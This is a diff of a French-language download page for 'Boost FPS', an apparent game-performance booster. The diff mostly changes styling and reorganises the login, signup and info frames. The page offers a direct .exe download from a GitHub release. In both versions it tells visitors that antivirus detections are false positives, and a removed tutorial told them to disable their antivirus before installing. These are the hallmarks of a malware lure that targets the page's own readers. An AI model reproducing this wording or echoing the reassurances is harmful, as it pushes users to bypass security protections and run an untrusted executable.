@@ -84,6 +84,7 @@
             width: 100%;
             max-width: 1200px;
             padding: 20px;
+            flex-grow: 1;
         }
 
         .frame {
@@ -92,11 +93,11 @@
             border-radius: 15px;
             box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
             margin-top: 30px;
-            display: none; /* Cache les frames par défaut */
+            display: none;
         }
 
         .frame.active {
-            display: block; /* Affiche la frame active */
+            display: block;
         }
 
         .download-button {
@@ -142,6 +143,8 @@
             width: 100%;
             margin-top: 50px;
             box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+            bottom: 0;
         }
 
         footer p {
@@ -156,6 +159,60 @@
 
         footer a:hover {
             color: #ff4c3b;
+        }
+
+        .input-field {
+            width: 100%;
+            max-width: 400px;
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+
+        .input-field:focus {
+            border-color: #ff6f61;
+            background-color: #fff;
+            outline: none;
+        }
+
+        .action-button {
+            padding: 12px 30px;
+            background-color: #ff6f61;
+            color: #fff;
+            font-size: 1.2em;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            max-width: 200px;
+            margin: 10px 0;
+        }
+
+        .action-button:hover {
+            background-color: #ff4c3b;
+            transform: translateY(-5px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .close-button {
+            padding: 10px 20px;
+            background-color: #888;
+            color: #fff;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+        }
+
+        .close-button:hover {
+            background-color: #666;
         }
 
         @media (max-width: 768px) {
@@ -216,50 +273,29 @@
             <a href="https://github.com/seyzperly572/New/releases/download/boostfps/boostfps2.0.exe" download="boostfps2.0.exe" class="download-button">Télécharger</a>
         </div>
 
-        <!-- Frame Version -->
-        <div id="version-frame" class="frame">
-            <h2>Version actuelle</h2>
-            <p>Boost FPS v2.0 - Dernière mise à jour : Mars 2025.</p>
-        </div>
-
-        <!-- Frame Tutoriel -->
-        <div id="tuto-frame" class="frame">
-            <h2>Tutoriel d'installation</h2>
-            <p>1. Télécharge Boost FPS.</p>
-            <p>2. Désactive ton antivirus temporairement si nécessaire.</p>
-            <p>3. Lance l'installation et suis les instructions.</p>
-        </div>
-
-        <!-- Frame Contact -->
-        <div id="contact-frame" class="frame">
-            <h2>Contact & Support</h2>
-            <p>📧 Email : <a href="mailto:studio-booster@gmail.com">studio-booster@gmail.com</a></p>
-            <p>💬 Discord : <a href="https://discord.gg/gdk29Aac" target="_blank">Rejoindre le serveur</a></p>
+        <!-- Frame Infos supplémentaires -->
+        <div id="info-frame" class="frame">
+            <h2>En savoir plus</h2>
+            <p>Il est possible que certains antivirus détectent notre application comme une menace à cause de la manière dont elle optimise les performances de votre PC. Ce comportement est souvent signalé par des faux positifs.</p>
+            <button onclick="hideAllFrames()" class="close-button">Fermer</button>
         </div>
 
         <!-- Frame Connexion -->
         <div id="login-frame" class="frame">
             <h2>Se connecter</h2>
-            <input type="text" id="email" placeholder="Email" value="" />
-            <input type="password" id="password" placeholder="Mot de passe" value="" />
-            <button onclick="login()">Se connecter</button>
-            <button onclick="hideAllFrames()">Fermer</button>
+            <input type="email" id="email" placeholder="Email" class="input-field" />
+            <input type="password" id="password" placeholder="Mot de passe" class="input-field" />
+            <button onclick="login()" class="action-button">Se connecter</button>
+            <button onclick="hideAllFrames()" class="close-button">Fermer</button>
         </div>
 
         <!-- Frame Inscription -->
         <div id="signup-frame" class="frame">
             <h2>S'inscrire</h2>
-            <input type="text" id="signup-email" placeholder="Email" />
-            <input type="password" id="signup-password" placeholder="Mot de passe" />
-            <button onclick="signup()">S'inscrire</button>
-            <button onclick="hideAllFrames()">Fermer</button>
-        </div>
-
-        <!-- Frame Infos supplémentaires -->
-        <div id="info-frame" class="frame">
-            <h2>En savoir plus</h2>
-            <p>Il est possible que certains antivirus détectent notre application comme une menace à cause de la manière dont elle optimise les performances de votre PC. Ce comportement est souvent signalé par des faux positifs.</p>
-            <button onclick="hideAllFrames()">Fermer</button>
+            <input type="email" id="signup-email" placeholder="Email" class="input-field" />
+            <input type="password" id="signup-password" placeholder="Mot de passe" class="input-field" />
+            <button onclick="signup()" class="action-button">S'inscrire</button>
+            <button onclick="hideAllFrames()" class="close-button">Fermer</button>
         </div>
     </div>
 
